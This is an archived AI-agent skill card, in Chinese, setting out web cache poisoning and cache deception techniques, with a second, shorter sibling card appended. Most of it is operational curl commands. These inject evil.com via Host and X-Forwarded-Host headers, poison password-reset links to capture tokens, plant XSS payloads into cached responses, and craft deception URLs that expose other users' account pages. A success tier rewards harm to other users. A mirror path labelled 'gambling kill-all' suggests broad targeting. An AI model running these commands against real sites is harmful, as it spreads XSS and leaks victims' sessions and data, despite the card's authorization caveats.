<!-- archived from /root/.hermes/skills/security/web-cache-poisoning/SKILL.md on 2026-10-21 -->

---
name: web-cache-poisoning
description: >-
 Web 缓存投毒完整手法：Host 头注入投毒、X-Forwarded-Host 反射、
 Fat GET 请求投毒、未键控头投毒 XSS、缓存欺骗（CPD）、
 参数注入投毒、DoS 缓存投毒。
  用户提到缓存投毒、cache poisoning、X-Forwarded-Host、
  Host 注入、缓存欺骗、Web Cache Deception、/account/x.css 时使用。
 WAF 绕过走 evasion；HTTP 走私走 http-request-smuggling。
version: 1.0.0
---

> 归档卡：原目录 `/root/.hermes/skills/security/web-cache-poisoning`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/web-cache-poisoning/…')`，不要相对 `references/legacy/` 解析。

# Web 缓存投毒完整手法

**前提**：目标在 `config/scope*.json`。投毒会影响所有后续用户请求，**操作前确认案卷/出证据即清除**。

---

## §1 原理与分类

```
缓存键（Cache Key）: 通常是 Host + Path + 某些查询参数
未键控输入（Unkeyed）: 某些请求头虽不在 Cache Key 里，但影响响应内容
→ 攻击者注入未键控头的恶意值 → 响应被缓存 → 其他用户收到带毒响应

Web Cache Deception（欺骗）:
 诱导用户访问 /profile/nonexistent.css
 → CDN 以为是静态文件缓存响应
 → 后续访客读到受害者的响应
```

---

## §2 快速检测（未键控头探测）

```bash
python3 tools/ops/cache_poison_probe.py --url https://授权站/ --case <案卷>
# Param Miner（Burp 插件）自动检测未键控头
# Extensions → BApp Store → Param Miner → Guess Headers

# 手工：注入 Host 变体观察响应
curl -s "https://授权站/" \
 -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"

curl -s "https://授权站/" \
 -H "X-Forwarded-Scheme: nothttps" | grep -iE "evil|nothttps|scheme"

curl -s "https://授权站/" \
 -H "X-Host: evil.com" | grep -i evil

# 添加 cache-buster（避免读到缓存结果）
curl -s "https://授权站/?cb=12345" \
 -H "X-Forwarded-Host: evil.com" | grep -i evil
```

---

## §3 Host 头注入投毒

```bash
# 测试 Host 头是否在响应中反射
curl -s "https://授权站/?cb=test1" \
 -H "Host: evil.com" | grep -iE "evil.com|script|href"

# 常见反射场景
# 1. 密码重置邮件中的链接
curl -s -X POST "https://授权站/api/password/reset" \
 -H "Host: evil.com" \
 -H "Content-Type: application/json" \
 -d '{"email":"<EMAIL-REDACTED>"}'
# → 邮件中的链接变成 https://evil.com/reset?token=...

# 2. OAuth redirect_uri 基于 Host
curl -s "https://授权站/oauth/authorize" \
 -H "Host: evil.com" \
 -d 'client_id=x&redirect_uri=https://evil.com/callback'

# 3. JS 资源 URL 基于 Host
# 如果 <script src="//HOST/js/app.js"> 被缓存
# 下次真实用户访问时加载 evil.com 的 JS
```

---

## §4 X-Forwarded-Host 投毒（XSS）

```bash
# 应用反射 X-Forwarded-Host 到响应中（常见于本地 URL 生成）
curl -s "https://授权站/" \
 -H "X-Forwarded-Host: evil.com\"><script>alert(1)</script>" \
 | grep -i "script"

# 或注入内容 URL
curl -s "https://授权站/" \
 -H "X-Forwarded-Host: evil.com" \
 | grep -oE 'src="[^"]*evil[^"]*"'

# 找到反射后，投毒持久化
# 1. 移除 cache-buster 参数
# 2. 多次发送相同请求直到被缓存（Surrogate-Control/Cache-Control: max-age > 0）
# 3. 正常用户访问 → 触发 XSS
```

---

## §5 Fat GET（GET + Body）投毒

```bash
# 某些框架支持 GET 请求带 body，但 CDN 用 GET 方法缓存
# → Body 参数不在 Cache Key 里 → 可注入

curl -s -X GET "https://授权站/api/search" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d 'callback=alert(1)'
# 若响应反射 callback 值但 CDN 按 GET 缓存 → 存储型 XSS

# POST Override 投毒
curl -s -X POST "https://授权站/api/data" \
 -H "X-HTTP-Method-Override: GET" \
 -d 'inject=<script>alert(1)</script>'
```

---

## §6 参数注入（Query Parameter Poisoning）

```bash
# CDN 缓存 /api/user?id=1 和 /api/user?id=1&extra=injected 不同
# 但应用返回相同内容 → 注入的参数可能被反射/利用

# 找未键控查询参数（Param Miner 检测）
curl -s "https://授权站/page?cb=test" | md5sum # 基准
curl -s "https://授权站/page?cb=test&evil=1" | md5sum # 响应是否变化？

# 若 UTM 参数被反射
curl -s "https://授权站/?utm_content=<script>alert(1)</script>" \
 | grep -i script
```

---

## §7 Web Cache Deception（缓存欺骗）

**目标**：诱导受害者访问特定 URL，CDN 错误缓存其私有响应，攻击者读取缓存。

```bash
# 构造欺骗 URL（在私有 API 路径后加静态扩展名）
https://授权站/api/user/profile/hack.css
https://授权站/account/settings/hack.js
https://授权站/dashboard/hack.png

# 步骤：
# 1. 自己访问 URL，看 CDN 是否缓存
curl -si "https://授权站/api/user/profile/hack.css" | grep -iE "x-cache|cf-cache|age:"

# 2. 若 X-Cache: HIT，发给受害者访问相同 URL
# 3. 受害者访问后，攻击者读取已缓存的响应（含受害者数据）

# 验证：
# 用 User A 的账号访问 → 清除缓存 → 用 User A 访问 /profile/hack.css
# 换 User B 访问同 URL → 若返回 User A 数据 = 缓存欺骗成立
```

---

## §8 缓存头识别与调试

```bash
# 识别缓存层
curl -si "https://授权站/" | grep -iE "x-cache|cf-cache-status|age:|cache-control|surrogate-control|cdn-cache"

# Cloudflare 缓存标志
# CF-Cache-Status: HIT / MISS / EXPIRED / BYPASS / DYNAMIC
# Age: N (秒)

# 清除缓存（测试用）
curl -s "https://授权站/page?cb=$(date +%s)" # 新 cache-buster
# 或 Cloudflare 开发者模式（需要账号）

# 缓存时间判断
# Cache-Control: max-age=300 → 5分钟缓存
# Surrogate-Control: max-age=86400 → CDN 缓存1天
# Vary: Accept-Encoding → 按编码分别缓存
```

---

## §9 自动化工具

```bash
# Web Cache Vulnerability Scanner
pip install wcvs
wcvs -u "https://授权站/" -v

# nuclei 缓存投毒模板
nuclei -u "https://授权站" -tags cache-poisoning,xss -severity medium,high

# 手工 Burp 工作流
# 1. Proxy → HTTP history 找有 Cache 头的响应
# 2. Extensions → Param Miner → 右键 → Guess headers
# 3. Repeater 手工确认反射
# 4. 移除 cb 参数测试真实缓存效果
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 发现未键控反射（非缓存下） |
| L2 | 响应被缓存（X-Cache: HIT + 反射内容存在） |
| L3 | 其他用户受影响（存储型 XSS / 私有数据泄露）|

---

## 真源

- 手法：`docs/playbooks/测绘引擎缓存投毒作业手法.md`
- 工具：`python3 tools/ops/cache_poison_probe.py --url https://授权站/ --case <案>`
- 只要欺骗：`--deception-only`（旧入口 `web-cache-deception` 已并入本卡）

---

<!-- 补充视角: web-cache-attacks (兄弟技能库 2026-09-12) -->

---
name: web-cache-attacks
description: "Web缓存投毒/欺骗测试时使用。触发: 缓存投毒, cache poisoning, 未键控头, 缓存欺骗。"
version: 1.0.0
license: MIT
metadata:
    related_skills: [http-smuggling-protocol-abuse, web-logic-bypass-family, surveyengine-knowledge-pack]
---

# Web 缓存投毒 / 缓存欺骗 (Cache Poisoning & Deception)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\web-cache-poisoning\SKILL.md`,web-cache-deception 已并入本卡)。

## §1 原理
- **缓存投毒**: 缓存键=Host+Path+部分参数;**未键控头**(不在缓存键但影响响应内容)注入恶意值 → 响应被缓存 → 所有用户收到带毒响应
- **缓存欺骗**: 诱导用户访问 `/profile/nonexistent.css` → CDN 当静态文件缓存 → 后续访客读到受害者响应
- ⚠️ 投毒影响所有后续用户,**操作前确认案卷,出证据即清除**

## §2 快速检测(未键控头探测)
```bash
# 每种头 + cache-buster(避免读到缓存结果)
curl -s "https://TARGET/?cb=12345" -H "X-Forwarded-Host: evil.com" | grep -i evil
curl -s "https://TARGET/?cb=12345" -H "X-Forwarded-Scheme: nothttps" | grep -iE "evil|nothttps"
curl -s "https://TARGET/?cb=12345" -H "X-Host: evil.com" | grep -i evil
# Burp Param Miner → Guess Headers 自动找未键控头
```

## §3 Host 头注入投毒
```bash
# Host 在响应中反射的 3 大场景:
# 1. 密码重置邮件链接 → Host: evil.com → 邮件链接 https://evil.com/reset?token=...
# 2. OAuth redirect_uri 基于 Host
# 3. JS 资源 <script src="//HOST/js/app.js"> 被缓存 → 用户加载 evil.com JS(XSS)
curl -s -X POST "https://TARGET/api/password/reset" -H "Host: evil.com" -d '{"email":"<EMAIL-REDACTED>"}'
```

## §4 X-Forwarded-Host 投毒(XSS)
```bash
# 反射到响应 → 注入 payload
curl -s "https://TARGET/" -H 'X-Forwarded-Host: evil.com"><script>alert(1)</script>'
# 找到反射后持久化: 移除 cache-buster → 多次发送直到被缓存(Surrogate-Control/Cache-Control max-age>0) → 正常用户触发
```

## §5 Fat GET(GET + Body)投毒
- 某些框架支持 GET 带 body,CDN 按 GET 方法缓存 → body 参数不在缓存键 → 可注入

## §6 缓存欺骗
```bash
# /account/nonexistent.css 路径混淆 → 个人页被 CDN 缓存 → 他人访问读到受害者账户页
curl -s "https://TARGET/account/anything.css"  # 返回 200 账户页而非 404?
# 检测: X-Cache: hit / Age 头 / 响应含登录后内容但无 cookie
```

## 成功口径
| 档 | 成立 | 不算 |
|----|------|------|
| L1 | 找到未键控头且注入值反射 | 只有缓存头 |
| L2 | 带毒响应被缓存,无 cookie 请求读到 | 仅反射未缓存 |
| L3 | 受害者会话/数据经缓存泄露(欺骗)或 XSS 投毒落地 | — |

## 纪律
- 投毒影响其他用户 → 授权内做,证明即清(发 cache-buster 请求或等待 TTL)
- 缓存欺骗用自己账号验证,不读他人数据

## 完整情报
镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\web-cache-poisoning\SKILL.md`(222行)
